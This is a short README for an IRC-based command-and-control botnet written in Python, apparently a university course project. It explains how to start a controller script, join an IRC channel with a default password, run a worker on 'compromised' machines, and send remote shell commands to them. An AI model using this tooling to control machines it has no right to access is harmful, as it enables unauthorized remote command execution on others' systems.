# python-botnet
An IRC command & control botnet. Use this to communicate with machines that you have compromised and gained access to.

## How to use
Inside the directory run the command
```
python boss.py
```
Now open your favorite IRC chat client and connect to the IRC server (default is i'rc.freenode.net'), join the channel #cs460botnet-jlchao2.

In the chat box type:
```
!auth password
```
with whatever password you started boss.py with (default is 'password').

On a compromised machine, run:
```
python worker.py -n *name*
```
with some *name* for the worker.

Now in the IRC client, you can type:
```
!status
```
and see that there is one worker available.

You can send commands for the worker(s) to run:
```
!execute [num-workers] *command*
```
for example
```
!execute run vmstat
```
and view the output with:
```
!print
```
